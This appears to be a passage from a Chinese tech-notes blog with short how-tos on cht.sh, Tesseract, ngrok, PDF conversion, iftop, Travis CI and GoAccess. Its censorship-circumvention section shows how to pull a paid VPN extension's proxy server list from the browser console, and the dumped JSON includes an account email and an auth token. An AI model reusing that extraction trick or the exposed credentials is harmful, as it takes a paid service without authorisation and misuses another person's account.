class="comment">/*</span></span><br><span class="line"><span class="comment"> * functional programming - PHP's array_map including keys</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Not with array_map, as it doesn't handle keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * array_walk (http:www.php.net/manual/en/function.array-walk.php)</span></span><br><span class="line"><span class="comment"> * does:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$test_array = array(<span class="string">"first_key"</span> =&gt; <span class="string">"first_value"</span>,</span><br><span class="line">                    <span class="string">"second_key"</span> =&gt; <span class="string">"second_value"</span>);</span><br><span class="line">array_walk($test_array, <span class="function"><span class="keyword">function</span>(<span class="params">&amp;$a, $b</span>) </span>&#123; $a = <span class="string">"$b loves $a"</span>; &#125;);</span><br><span class="line">var_dump($test_array);</span><br><span class="line">[root@VM_0_14_centos blog]# curl https://cht.sh/:cht.sh &gt; cht.sh</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span> <span class="number">12427</span>  <span class="number">100</span> <span class="number">12427</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">2397</span>      <span class="number">0</span>  <span class="number">0</span>:<span class="number">00</span>:<span class="number">05</span>  <span class="number">0</span>:<span class="number">00</span>:<span class="number">05</span> --:--:--  <span class="number">2426</span></span><br><span class="line">[root@VM_0_14_centos blog]# ll cht.sh</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">12427</span> Feb  <span class="number">1</span> <span class="number">10</span>:<span class="number">10</span> cht.sh</span><br><span class="line">[root@VM_0_14_centos blog]# which php</span><br><span class="line">/usr/bin/php</span><br><span class="line">[root@VM_0_14_centos blog]# mv cht.sh /usr/bin/</span><br><span class="line">[root@VM_0_14_centos blog]# chmod +x /usr/bin/cht.sh</span><br><span class="line">[root@VM_0_14_centos blog]# cht.sh go reverse a list</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * How do I reverse an array in Go?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Honestly this one is simple enough that I'd just write it out like</span></span><br><span class="line"><span class="comment"> * this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">    s := []int&#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, <span class="attr">j</span> := <span class="number">0</span>, len(s)<span class="number">-1</span>; i &lt; j; i, j = i+<span class="number">1</span>, j<span class="number">-1</span> &#123;</span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(s)</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//github.com/chubin/cheat.sh  https://github.com/tpanj/cht.exe</span></span><br><span class="line">  $ cht.sh --shell</span><br><span class="line">    cht.sh&gt; cd go</span><br><span class="line">    cht.sh/go&gt; reverse a list</span><br></pre></td></tr></table></figure>
<h3 id="Tesseract图片文字识别初探"><a href="#Tesseract图片文字识别初探" class="headerlink" title="Tesseract图片文字识别初探"></a>Tesseract图片文字识别初探</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">brew install tesseract</span><br><span class="line">➜ tesseract --version</span><br><span class="line">tesseract <span class="number">3.04</span><span class="number">.01</span></span><br><span class="line"> leptonica<span class="number">-1.73</span></span><br><span class="line">  libjpeg <span class="number">8</span>d : libpng <span class="number">1.6</span><span class="number">.23</span> : libtiff <span class="number">4.0</span><span class="number">.6</span> : zlib <span class="number">1.2</span><span class="number">.5</span></span><br><span class="line">  brew intsall tesseract</span><br><span class="line">  cd /usr/local/Cellar/tesseract/&#123;version&#125;/share/tessdata</span><br><span class="line">  wget https:<span class="comment">//github.com/tesseract-ocr/tessdata/raw/master/chi_sim.traineddata</span></span><br><span class="line">  使用brew安装所有语言包：</span><br><span class="line">  </span><br><span class="line">  brew install tesseract --all-languages</span><br><span class="line"></span><br><span class="line">tesseract paper.png paper -l chi_sim</span><br><span class="line">tesseract --print-parameters</span><br></pre></td></tr></table></figure>
<h3 id="ngrok内网穿透"><a href="#ngrok内网穿透" class="headerlink" title="ngrok内网穿透"></a>ngrok内网穿透</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ngrok -config=ngrok.cfg -subdomain guowei8888 <span class="number">80</span></span><br><span class="line"> </span><br><span class="line">-subdomain guowei8888   guowei8888 表示 是你自定义的域名前缀，必须唯一的，建议以qq号码，邮箱用户名等</span><br><span class="line"> </span><br><span class="line"><span class="number">80</span> 表示 暴露的端口号 可以修改其他的 例如 <span class="number">81</span> <span class="number">8080</span> http:<span class="comment">//www.54php.cn/default/211.html</span></span><br><span class="line">ngrok -config=ngrok.cfg -subdomain guowei8888 <span class="number">80</span></span><br><span class="line"></span><br><span class="line"> ./ngrok -config=ngrok.cfg -subdomain mysusheng <span class="number">80</span></span><br><span class="line">小 米 球 Ngrok http:<span class="comment">//ngrok.ciqiuwl.cn/  by:刺 球  QQ:752102401                                  (Ctrl+C to quit)# Con</span></span><br><span class="line">                                                                                                            TunneTunnel Status                 online</span><br><span class="line">Version                       <span class="number">1.7</span>/<span class="number">1.7</span></span><br><span class="line">Forwarding                    https:<span class="comment">//mysusheng.ngrok.xiaomiqiu.cn -&gt; 127.0.0.1:80</span></span><br><span class="line">Forwarding                    http:<span class="comment">//mysusheng.ngrok.xiaomiqiu.cn -&gt; 127.0.0.1:80</span></span><br><span class="line">Web Interface                 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4040</span></span><br><span class="line"># Conn                        1</span><br><span class="line">Avg Conn Time                 <span class="number">0.00</span>ms</span><br></pre></td></tr></table></figure>
<h3 id="doc-ppt-转-pdf"><a href="#doc-ppt-转-pdf" class="headerlink" title="doc ppt 转 pdf"></a>doc ppt 转 pdf</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># yum install ImageMagick libreoffice  </span><br><span class="line">ibreoffice可以实现doc,ppt转pdf</span><br><span class="line">imagemagick可以实现pdf转图片</span><br><span class="line">二，libreoffice添加字体</span><br><span class="line">libreoffice自带的字体很少，如果libreoffice找到字体，就会默认使用宋体，五号字</span><br><span class="line"># mount /dev/sda1 /mnt/win7/  </span><br><span class="line"># cp -r /mnt/win7/Windows/Fonts/ /home/tank/.config/libreoffice/4/user/fonts </span><br><span class="line"></span><br><span class="line">$ <span class="keyword">export</span> DISPLAY=:<span class="number">0.0</span> &amp;&amp; libreoffice --headless --invisible --convert-to pdf <span class="number">123.</span>ppt  </span><br><span class="line">convert /home/tank/download/myppt/<span class="number">123.</span>ppt -&gt; <span class="regexp">/home/</span>tank/download/myppt/<span class="number">123.</span>pdf using impress_pdf_Export  </span><br><span class="line">Overwriting: <span class="regexp">/home/</span>tank/download/myppt/<span class="number">123.</span>pdf</span><br><span class="line">$ convert -verbose -density <span class="number">150</span> -trim <span class="number">123.</span>pdf -quality <span class="number">70</span> -sharpen <span class="number">0x1</span><span class="number">.0</span> <span class="number">123.</span>jpg  </span><br><span class="line"><span class="string">"gs"</span> -q -dQUIET -dPARANOIDSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=<span class="number">500000000</span> -dAlignToPixels=<span class="number">0</span> -dGridFitTT=<span class="number">0</span> <span class="string">"-sDEVICE=pnmraw"</span> -dTextAlphaBits=<span class="number">4</span> -dGraphicsAlphaBits=<span class="number">4</span> <span class="string">"-r150x150"</span> <span class="string">"-sOutputFile=/tmp/magick-XXSi41Xk"</span> <span class="string">"-f/tmp/magick-XXkgR3hF"</span> <span class="string">"-f/tmp/magick-XXQJ4sEZ"</span>  </span><br><span class="line">/tmp/magick-XXSi41Xk[<span class="number">0</span>] PNM <span class="number">1240</span>x1754 <span class="number">1240</span>x1754+<span class="number">0</span>+<span class="number">0</span> <span class="number">8</span>-bit DirectClass <span class="number">18.67</span>mb  </span><br><span class="line">/tmp/magick-XXSi41Xk[<span class="number">1</span>] PNM <span class="number">1240</span>x1754 <span class="number">1240</span>x1754+<span class="number">0</span>+<span class="number">0</span> <span class="number">8</span>-bit DirectClass <span class="number">18.67</span>mb  </span><br><span class="line">/tmp/magick-XXSi41Xk[<span class="number">2</span>] PNM <span class="number">1240</span>x1754 <span class="number">1240</span>x1754+<span class="number">0</span>+<span class="number">0</span> <span class="number">8</span>-bit DirectClass <span class="number">18.67</span>mb  </span><br><span class="line"><span class="number">123.</span>pdf[<span class="number">0</span>] PDF <span class="number">1240</span>x1754 <span class="number">1240</span>x1754+<span class="number">0</span>+<span class="number">0</span> <span class="number">16</span>-bit DirectClass <span class="number">18.67</span>mb  </span><br><span class="line"><span class="number">123.</span>pdf[<span class="number">0</span>] PDF <span class="number">1240</span>x1754 <span class="number">1240</span>x1754+<span class="number">0</span>+<span class="number">0</span> <span class="number">16</span>-bit DirectClass <span class="number">18.67</span>mb  </span><br><span class="line"><span class="number">123.</span>pdf[<span class="number">0</span>] PDF <span class="number">1240</span>x1754 <span class="number">1240</span>x1754+<span class="number">0</span>+<span class="number">0</span> <span class="number">16</span>-bit DirectClass <span class="number">18.67</span>mb  </span><br><span class="line"><span class="number">123.</span>pdf=&gt;<span class="number">123</span><span class="number">-0.</span>jpg[<span class="number">0</span>] PDF <span class="number">1240</span>x1754=&gt;<span class="number">546</span>x1417 <span class="number">1240</span>x1754+<span class="number">199</span>+<span class="number">168</span> <span class="number">16</span>-bit DirectClass <span class="number">140</span>kb  </span><br><span class="line"><span class="number">123.</span>pdf=&gt;<span class="number">123</span><span class="number">-1.</span>jpg[<span class="number">1</span>] PDF <span class="number">1240</span>x1754=&gt;<span class="number">623</span>x1417 <span class="number">1240</span>x1754+<span class="number">199</span>+<span class="number">168</span> <span class="number">16</span>-bit DirectClass <span class="number">108</span>kb  </span><br><span class="line"><span class="number">123.</span>pdf=&gt;<span class="number">123</span><span class="number">-2.</span>jpg[<span class="number">2</span>] PDF <span class="number">1240</span>x1754=&gt;<span class="number">653</span>x703 <span class="number">1240</span>x1754+<span class="number">199</span>+<span class="number">168</span> <span class="number">16</span>-bit DirectClass <span class="number">68</span>kb </span><br><span class="line"># yum install http://pkgs.repoforge.org/unoconv/unoconv-0.5-1.el6.rf.noarch.rpm    </span><br><span class="line">  </span><br><span class="line"># unoconv -f pdf 123.ppt     //将123.ppt转成pdf   http://blog.51yip.com/linux/1669.html</span><br></pre></td></tr></table></figure>
<h3 id="网盘"><a href="#网盘" class="headerlink" title="网盘"></a>网盘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.yunpanjingling.com/</span></span><br><span class="line">http:<span class="comment">//www.aisouziyuan.com/</span></span><br><span class="line">http:<span class="comment">//www.speedpan.com/</span></span><br><span class="line">https:<span class="comment">//github.com/CodeTips/BaiduNetdiskPlugin-macOS</span></span><br><span class="line">https:<span class="comment">//www.66s.cc/</span></span><br><span class="line">https:<span class="comment">//www.makcyun.top/www.bttwo.com/</span></span><br><span class="line">ifkdy.com/  </span><br><span class="line">http:<span class="comment">//www.51ape.com/</span></span><br></pre></td></tr></table></figure>
<h3 id="翻墙"><a href="#翻墙" class="headerlink" title="翻墙"></a>翻墙</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.lazyman.vip/2019/02/16/%E5%A6%82%E4%BD%95%E6%8A%93%E5%8C%85%E7%A0%B4%E8%A7%A3%E4%BB%98%E8%B4%B9%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E8%8A%82%E7%82%B9%E3%80%818k%E7%A7%92%E5%BC%80%E3%80%81%E4%BB%A5%E5%8F%8A%E5%AF%B9HTTP%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%81%E7%9B%B4%E6%8E%A5%E7%A2%BE%E5%8E%8BSSR%E5%92%8C%E5%B0%8F%E7%81%AB%E7%AE%AD/</span></span><br><span class="line">下载Chrome扩展</span><br><span class="line"> webvpn 下载后注册，然后登陆 点击设置按钮 chrome-extension:<span class="comment">//hcohobfmhkabhpcedpbiddhoeeihcgpp/config.html</span></span><br><span class="line"> 点击 you will get 在控制台可以看到 reset response 选择所有server 右键 store <span class="keyword">as</span> global value ,执行copy(temp1)</span><br><span class="line"> </span><br><span class="line"> &#123;</span><br><span class="line">   <span class="string">"user"</span>: &#123;</span><br><span class="line">     <span class="string">"email"</span>: <span class="string">"mybestpartner@sina.com"</span>,</span><br><span class="line">     <span class="string">"auth"</span>: <span class="string">"4gagyrCt9uxt25Mw99n2Kw=="</span>,</span><br><span class="line">     <span class="string">"deadline"</span>: <span class="number">1551352996</span>,</span><br><span class="line">     <span class="string">"recommendUrl"</span>: <span class="string">"&lt;div class=\"tip\"&gt;请发送此链接到您的朋友，朋友注册并付费，&lt;br&gt;您将获得30 天的奖励&lt;/div&gt; https://jiasuqi.xyz/server13725"</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="string">"servers"</span>: &#123;</span><br><span class="line">     <span class="string">"VIP_PS_2"</span>: &#123;</span><br><span class="line">       <span class="string">"default"</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">"server"</span>: <span class="string">"los-2.cdn-aliyun.com:888"</span>,</span><br><span class="line">       <span class="string">"Auth"</span>: <span class="literal">null</span>,</span><br><span class="line">       <span class="string">"type"</span>: <span class="string">"HTTPS"</span>,</span><br><span class="line">       <span class="string">"name"</span>: <span class="string">"VIP_US_D"</span></span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">"VIP_PS_3"</span>: &#123;</span><br><span class="line">       <span class="string">"default"</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">"server"</span>: <span class="string">"losasdsfesfsffw3.cdn-aliyun.com"</span>,</span><br><span class="line">       <span class="string">"Auth"</span>: <span class="literal">null</span>,</span><br><span class="line">       <span class="string">"type"</span>: <span class="string">"HTTPS"</span>,</span><br><span class="line">       <span class="string">"name"</span>: <span class="string">"VIP_US_A"</span></span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">"PHS_0"</span>: &#123;</span><br><span class="line">       <span class="string">"default"</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">"server"</span>: <span class="string">"www.buyao.bid:5050"</span>,</span><br><span class="line">       <span class="string">"Auth"</span>: <span class="literal">null</span>,</span><br><span class="line">       <span class="string">"filters"</span>: [</span><br><span class="line">         <span class="string">"google.com"</span>,</span><br><span class="line">         <span class="string">"google.com.hk"</span>,</span><br><span class="line">         <span class="string">"accounts.youtube.com"</span>,</span><br><span class="line">         <span class="string">"wikimedia.org"</span>,</span><br><span class="line">         <span class="string">"wikipedia.org"</span>,</span><br><span class="line">         <span class="string">"googlecode.com"</span>,</span><br><span class="line">         <span class="string">"googleusercontent.com"</span>,</span><br><span class="line">         <span class="string">"gstatic.com"</span>,</span><br><span class="line">         <span class="string">"gmail.com"</span>,</span><br><span class="line">         <span class="string">"googlegroups.com"</span>,</span><br><span class="line">         <span class="string">"goo.gl"</span>,</span><br><span class="line">         <span class="string">"googleratings.com"</span>,</span><br><span class="line">         <span class="string">"test-ggfwzs-proxy.com"</span>,</span><br><span class="line">         <span class="string">"t.co"</span></span><br><span class="line">       ],</span><br><span class="line">       <span class="string">"type"</span>: <span class="string">"HTTPS"</span>,</span><br><span class="line">       <span class="string">"name"</span>: <span class="string">"free 谷歌服务代理"</span></span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">"VIP_PS_1"</span>: &#123;</span><br><span class="line">       <span class="string">"default"</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">"server"</span>: <span class="string">"shop.cdn-aliyun.com"</span>,</span><br><span class="line">       <span class="string">"Auth"</span>: <span class="literal">null</span>,</span><br><span class="line">       <span class="string">"type"</span>: <span class="string">"HTTPS"</span>,</span><br><span class="line">       <span class="string">"name"</span>: <span class="string">"VIP_JP_A"</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="string">"filters"</span>: &#123;</span><br><span class="line">     <span class="string">"tumblr.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"youtube.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"google.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"googleapis.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"googlevideo.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"ytimg.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"ggpht.com"</span>: <span class="string">"VIP_PS_2"</span>,</span><br><span class="line">     <span class="string">"googleusercontent.com"</span>: <span class="string">"VIP_PS_2"</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> proxy switchyomega https:<span class="comment">//chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN</span></span><br><span class="line"> 点击扩展选项进入</span><br><span class="line"> chrome-extension:<span class="comment">//padekgcemlokbadohgkifijomclgjgif/options.html#!/profile/proxy</span></span><br><span class="line"> 代理服务器选择 https 服务器 www.buyao.bid 端口 <span class="number">5050</span> 应用选项 打开https:<span class="comment">//www.google.com/ 看看 </span></span><br><span class="line"> 另外还可以到处pac 文件给其他浏览器用，比如http:<span class="comment">//118.24.158.116:8888/fq.php 遨游浏览器也支持</span></span><br><span class="line"> https:<span class="comment">//raw.githubusercontent.com/bannedbook/fanqiang/master/jw/new.pac </span></span><br><span class="line"> <span class="keyword">var</span> FindProxyForURL = <span class="function"><span class="keyword">function</span>(<span class="params">init, profiles</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">url, host</span>) </span>&#123;</span><br><span class="line"><span class="meta">         "use strict"</span>;</span><br><span class="line">         <span class="keyword">var</span> result = init, scheme = url.substr(<span class="number">0</span>, url.indexOf(<span class="string">":"</span>));</span><br><span class="line">         <span class="keyword">do</span> &#123;</span><br><span class="line">             result = profiles[result];</span><br><span class="line">             <span class="keyword">if</span> (<span class="keyword">typeof</span> result === <span class="string">"function"</span>) result = result(url, host, scheme);</span><br><span class="line">         &#125; <span class="keyword">while</span> (<span class="keyword">typeof</span> result !== <span class="string">"string"</span> || result.charCodeAt(<span class="number">0</span>) === <span class="number">43</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">     &#125;;</span><br><span class="line"> &#125;(<span class="string">"+proxy"</span>, &#123;</span><br><span class="line">     <span class="string">"+proxy"</span>: <span class="function"><span class="keyword">function</span>(<span class="params">url, host, scheme</span>) </span>&#123;</span><br><span class="line"><span class="meta">         "use strict"</span>;</span><br><span class="line">         <span class="keyword">if</span> (<span class="regexp">/^127\.0\.0\.1$/</span>.test(host) || <span class="regexp">/^::1$/</span>.test(host) || <span class="regexp">/^localhost$/</span>.test(host)) <span class="keyword">return</span> <span class="string">"DIRECT"</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">"HTTPS www.buyao.bid:5050"</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> 代理客户端 https:<span class="comment">//lilongyao.pipipan.com/fs/17545620-329570325 </span></span><br><span class="line"> 第一个sstap是代理的客户端</span><br><span class="line"> </span><br><span class="line"> 第二个ssupdate是获取节点的客户端</span><br><span class="line"> 你需要用第一个获取ssr的节点、然后把获取到的节点粘贴到代理客户端软件去！也可以不使用它提供的客户端、你也可以把获取到的节点复制下来用手机的ssr代理软件使用。</span><br><span class="line"> 这里它提供两个获取节点的选项、分别是我标出来 ishadow 和 应急专用 两个你随便选一个、然后在点一下右上角的 《<span class="number">99</span> 获取数据》的标志稍等几秒节点就出来了、然后鼠标在对应的节点下面单击一下右键、然后复制节点就ok了</span><br><span class="line"> 然后点一下代理端我标出来的那个 + 选择导入节点就行了</span><br><span class="line"> </span><br><span class="line"> 下面那个是代理规则的选项、今天试了一下感觉比shadowsocks还好用、而且它获取到的节点也可以用shadowsocks或shadowsockr 使用！</span><br></pre></td></tr></table></figure>
<h3 id="流量监控工具iftop"><a href="#流量监控工具iftop" class="headerlink" title="流量监控工具iftop"></a>流量监控工具iftop</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo yum install -y iftop</span><br><span class="line">➜  ~ rpm -q iftop             </span><br><span class="line">iftop<span class="number">-1.0</span><span class="number">-0.12</span>.pre4.el7.x86_64</span><br><span class="line">➜  ~ rpm -ql iftop</span><br><span class="line">/usr/sbin/iftop</span><br><span class="line">/usr/share/doc/iftop<span class="number">-1.0</span></span><br><span class="line">/usr/share/doc/iftop<span class="number">-1.0</span>/ChangeLog</span><br><span class="line">/usr/share/doc/iftop<span class="number">-1.0</span>/README</span><br><span class="line">/usr/share/doc/iftop<span class="number">-1.0</span>/TODO</span><br><span class="line">/usr/share/licenses/iftop<span class="number">-1.0</span></span><br><span class="line">/usr/share/licenses/iftop<span class="number">-1.0</span>/COPYING</span><br><span class="line">/usr/share/man/man8/iftop<span class="number">.8</span>.gz</span><br><span class="line">iftop -i eth0</span><br></pre></td></tr></table></figure>
<h3 id="自动测试Travis-CI"><a href="#自动测试Travis-CI" class="headerlink" title="自动测试Travis CI"></a>自动测试Travis CI</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//travis-ci.org/ ， 你可以选择通过GitHub账号登录他</span></span><br><span class="line">建立一个github库，就叫它travis_ci_test吧，测试使用就随意点好了。之后点击项目管理 https:<span class="comment">//travis-ci.org/account/repositories ，会列出你所有的GitHub库</span></span><br><span class="line"></span><br><span class="line">TravisCi为我们准备了超棒的配置文件，你可以在配置文件内随心所欲，例如打开某个目录，执行某条命令，他与dockerfile文件或者shell脚本很类似。只不过运行的容器在travisCi上，并非你本机</span><br><span class="line">在根目录建立文件 .travis.yml , 下面是具体的配置项</span><br><span class="line"></span><br><span class="line">language: php</span><br><span class="line">php:</span><br><span class="line">- <span class="number">7.1</span></span><br><span class="line">before_script:</span><br><span class="line">- composer install</span><br><span class="line">没错，五行配置就足够了，之后我们回到 https:<span class="comment">//travis-ci.com/dashboard，点击 trigger a build</span></span><br><span class="line">TravisCi 做了几个简单的事情</span><br><span class="line"><span class="number">1.</span> 开机</span><br><span class="line"><span class="number">2.</span> 克隆你的GITHUB项目</span><br><span class="line"><span class="number">3.</span> composer install</span><br><span class="line"><span class="number">4.</span> phpunit </span><br><span class="line">https:<span class="comment">//blog.fastrun.cn/2019/01/08/1-84/</span></span><br></pre></td></tr></table></figure>
<h3 id="GoAccess分析Nginx日志"><a href="#GoAccess分析Nginx日志" class="headerlink" title="GoAccess分析Nginx日志"></a>GoAccess分析Nginx日志</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">为了提高 GoAccess 分析准确度，需要配置 nginx.conf 的 log_format 项。</span><br><span class="line"></span><br><span class="line">log_format  main  <span class="string">'$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">                  <span class="string">'$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">                  <span class="string">'"$http_user_agent" "$http_x_forwarded_for" "$request_body"'</span>;</span><br><span class="line"></span><br><span class="line">$ wget http:<span class="comment">//tar.goaccess.io/goaccess-1.2.tar.gz</span></span><br><span class="line">$ tar -xzvf goaccess<span class="number">-1.2</span>.tar.gz</span><br><span class="line">$ cd goaccess<span class="number">-1.2</span>/</span><br><span class="line"># --with-openssl项开启openssl，HTTPS时需要</span><br><span class="line">$ ./configure --enable-utf8 --enable-geoip=legacy --<span class="keyword">with</span>-openssl</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ yum install GeoIP-devel</span><br><span class="line"># 或者安装全部依赖</span><br><span class="line">$ yum install glib2 glib2-devel GeoIP-devel  ncurses-devel zlib zlib-devel</span><br><span class="line">mv /usr/local/etc/goaccess.conf /etc/</span><br><span class="line">$ goaccess -a -d -f /data/logs/fanhaobai.com.access.log -p /etc/goaccess.conf -o /data/html/hexo/public/go-access.html</span><br><span class="line">$ goaccess -a -d -f /data/logs/fanhaobai.com.access.log 